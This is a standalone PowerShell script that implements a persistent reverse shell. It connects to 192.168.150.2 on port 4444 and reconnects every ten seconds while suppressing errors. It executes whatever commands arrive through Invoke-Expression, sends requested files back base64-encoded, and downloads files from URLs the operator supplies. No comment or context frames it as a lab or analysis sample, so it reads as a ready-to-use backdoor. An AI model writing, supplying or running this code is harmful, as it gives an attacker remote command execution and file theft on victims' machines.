$server = "192.168.150.2"
$port = 4444

while($true){
    try{
        $client = New-Object System.Net.Sockets.TCPClient($server, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        function Get-File($path){
            if(Test-Path $path){
                $bytes = [System.IO.File]::ReadAllBytes($path)
                $b64 = [Convert]::ToBase64String($bytes)
                $writer.WriteLine("FILE|$path|$b64")
            } else {
                $writer.WriteLine("ERROR|File not found: $path")
            }
            $writer.Flush()
        }
        
        function Put-File($url, $dest){
            try{
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($url, $dest)
                $writer.WriteLine("SUCCESS|Downloaded to $dest")
            } catch {
                $writer.WriteLine("ERROR|$($_.Exception.Message)")
            }
            $writer.Flush()
        }
        
        $writer.WriteLine("[+] Connected to $server")
        $writer.Flush()
        
        while(($line = $reader.ReadLine()) -ne $null){
            if($line -match "^GETFILE (.+)$"){
                Get-File $matches[1]
            }
            elseif($line -match "^PUTFILE (.+) (.+)$"){
                Put-File $matches[1] $matches[2]
            }
            else{
                try{
                    $output = iex $line 2>&1 | Out-String
                    $writer.WriteLine($output)
                } catch {
                    $writer.WriteLine("ERROR|$($_.Exception.Message)")
                }
                $writer.Flush()
            }
        }
    } catch {
        # Silently fail and retry
    }
    Start-Sleep -Seconds 10
}